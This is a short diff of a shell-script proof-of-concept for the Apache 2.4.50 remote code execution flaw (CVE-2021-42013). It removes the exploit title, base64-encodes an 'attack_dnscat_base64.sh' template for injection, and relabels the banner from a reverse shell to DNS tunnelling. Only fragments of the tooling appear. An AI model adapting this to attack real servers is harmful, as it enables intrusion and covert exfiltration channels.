@@ -1,4 +1,3 @@
-# Exploit: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)
 # Credits: Ash Daulton & cPanel Security Team
 # Date: 24/07/2021
 # Exploit Author: TheLastVvV.com
@@ -12,7 +11,7 @@
 #attach visa deployment
 inject=$(cat $(dirname -- "$0")/templates/attack_dnscat_base64.sh | base64)
 
-echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
+echo 'PoC DNSCAT - Tunneling over DNS'
 if [ $# -eq 0 ]
 then
 echo  "try: ./$0 http://ip:port"
